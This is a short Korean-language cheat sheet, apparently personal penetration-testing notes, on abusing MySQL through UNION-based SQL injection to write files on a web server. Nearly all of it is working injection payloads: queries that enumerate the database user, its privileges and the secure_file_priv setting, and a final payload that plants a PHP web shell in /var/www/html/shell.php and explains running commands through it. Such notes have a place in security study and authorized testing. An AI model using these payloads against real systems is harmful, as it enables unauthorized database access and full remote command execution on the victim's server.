MySQL을 이용해서 백엔드 서버에 파일 쓰기가 가능하기 위해서 필요한 3가지

1. FILE 권한이 있는 사용자
2. MySQL의 secure_file_priv 전역변수 비활성화
3. 백엔드 서버에서 쓰려는 위치에 대한 쓰기 액세스 권한

# 1. FILE 권한이 있는 사용자

### 현재 DB 사용자 조회

```
' UNION SELECT NULL, user(), NULL, NULL-- -
' UNION SELECT NULL, user, NULL, NULL from mysql.user-- -
```

설명: 현재 사용자가 루트로 조회된다면, 관리자(DBA) 권한이 있다는 뜻이다. 그리고 DBA가 있으면 파일 읽기 권한이 있을 확률이 훨씬 더 높다.

### 사용자 권한 조회

```
' UNION SELECT NULL, super_priv, NULL, NULL FROM mysql.user WHERE user="root"-- -
```

설명1: 현재 사용자가 root@localhost 일 때를 기준으로 작성 됨<br>
설명2: 만약에 Y가 반환된다면, 슈퍼 유저라는 의미

### 현재 사용자의 모든 권한 조회

```
' UNION SELECT NULL, grantee, privilege_type, NULL FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```

설명1: 현재 사용자가 root@localhost 일 때를 기준으로 작성 됨<br>
설명2: 만약에 FILE이 출력된다면, 파일을 읽을 수 있고 잠재적으로 파일을 쓸 수도 있음을 의미

# 2. MySQL의 secure_file_priv 전역변수 비활성화 확인

```
' UNION SELECT NULL, variable_name, variable_value, NULL FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

설명: SECURE_FILE_PRIV값만 나오고 그 다음 컬럼에 variable_value의 값이 비어있으면 모든 위치에서 파일을 읽고 쓸 수 있음을 의미

# 웹셸 업로드

```
' union select NULL, '<?php system($_REQUEST[0]); ?>', NULL, NULL into outfile '/var/www/html/shell.php'-- -
```

설명: 이후, 해당 페이지에서 ?0= 뒤에 명령어 입력
